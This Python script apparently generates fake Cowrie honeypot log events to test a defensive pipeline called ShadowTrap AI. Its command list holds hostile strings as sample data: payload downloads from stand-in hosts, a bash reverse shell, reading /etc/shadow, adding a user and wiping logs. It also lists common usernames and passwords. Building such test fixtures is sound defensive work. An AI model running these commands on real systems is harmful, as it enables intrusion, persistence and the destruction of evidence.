#!/usr/bin/env python3
"""
ShadowTrap AI - Log Injector (Development/Testing)
Injects fake Cowrie JSON events into the log file to test the pipeline
without needing a real Cowrie instance.

Usage: python scripts/inject_test_logs.py [--count 100] [--rate 0.5]
"""
import json
import time
import random
import argparse
import uuid
from datetime import datetime, timezone

FAKE_IPS = [
    "185.220.101.47", "45.33.32.156", "198.199.67.243",
    "159.89.49.82", "139.59.173.249", "104.248.228.211",
    "167.172.53.201", "46.101.240.214", "178.128.83.165",
    "64.227.38.78", "206.189.156.69", "68.183.182.102",
]

USERNAMES = ["root", "admin", "user", "test", "ubuntu", "pi", "oracle", "postgres",
             "mysql", "hadoop", "ftpuser", "deploy", "vagrant", "ansible"]

PASSWORDS = ["password", "123456", "admin", "root", "toor", "pass", "letmein",
             "qwerty", "abc123", "monkey", "1234567890", "changeme", "raspberry"]

COMMANDS = [
    "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /root",
    "wget http://malicious.example.com/payload.sh", "curl http://evil.com/bot -O",
    "chmod +x payload.sh", "./payload.sh",
    "python -c 'import socket,subprocess,os;s=socket.socket()'",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "cat /etc/shadow", "crontab -e", "useradd -m hacker",
    "iptables -F", "history -c", "rm -rf /var/log/*",
]


def make_session():
    return uuid.uuid4().hex[:16]


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def login_event(session: str, ip: str, success: bool = False) -> dict:
    return {
        "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
        "timestamp": ts(),
        "session": session,
        "src_ip": ip,
        "src_port": random.randint(40000, 65535),
        "username": random.choice(USERNAMES),
        "password": random.choice(PASSWORDS),
        "message": "login attempt",
    }


def command_event(session: str, ip: str) -> dict:
    return {
        "eventid": "cowrie.command.input",
        "timestamp": ts(),
        "session": session,
        "src_ip": ip,
        "input": random.choice(COMMANDS),
        "message": "command entered",
    }


def connect_event(session: str, ip: str) -> dict:
    return {
        "eventid": "cowrie.session.connect",
        "timestamp": ts(),
        "session": session,
        "src_ip": ip,
        "src_port": random.randint(40000, 65535),
        "message": "new connection",
    }


def close_event(session: str, ip: str) -> dict:
    return {
        "eventid": "cowrie.session.closed",
        "timestamp": ts(),
        "session": session,
        "src_ip": ip,
        "duration": round(random.uniform(0.5, 120.0), 3),
        "message": "connection closed",
    }


def main():
    parser = argparse.ArgumentParser(description="ShadowTrap AI - Test Log Injector")
    parser.add_argument("--log", default="/tmp/cowrie.json", help="Log file path")
    parser.add_argument("--count", type=int, default=50, help="Number of attack sessions")
    parser.add_argument("--rate", type=float, default=0.3, help="Seconds between events")
    args = parser.parse_args()

    print(f"🕷️  Injecting {args.count} fake attack sessions into {args.log}")
    print(f"   Rate: one event every {args.rate}s  |  Ctrl+C to stop\n")

    total_events = 0

    with open(args.log, "a") as f:
        for i in range(args.count):
            ip = random.choice(FAKE_IPS)
            session = make_session()

            # Session connect
            f.write(json.dumps(connect_event(session, ip)) + "\n")
            f.flush()
            total_events += 1
            time.sleep(args.rate)

            # Login attempts (1–15 per session)
            num_attempts = random.randint(1, 15)
            success = random.random() < 0.1  # 10% success rate

            for j in range(num_attempts):
                is_last = j == num_attempts - 1
                f.write(json.dumps(login_event(session, ip, success=success and is_last)) + "\n")
                f.flush()
                total_events += 1
                time.sleep(args.rate)

            # Commands if login succeeded
            if success:
                for _ in range(random.randint(2, 8)):
                    f.write(json.dumps(command_event(session, ip)) + "\n")
                    f.flush()
                    total_events += 1
                    time.sleep(args.rate)

            # Session close
            f.write(json.dumps(close_event(session, ip)) + "\n")
            f.flush()
            total_events += 1

            print(f"  [{i+1}/{args.count}] Session {session[:8]}... | IP={ip} | attempts={num_attempts} | success={success}")
            time.sleep(args.rate)

    print(f"\n✅ Done! Injected {total_events} events across {args.count} sessions.")


if __name__ == "__main__":
    main()
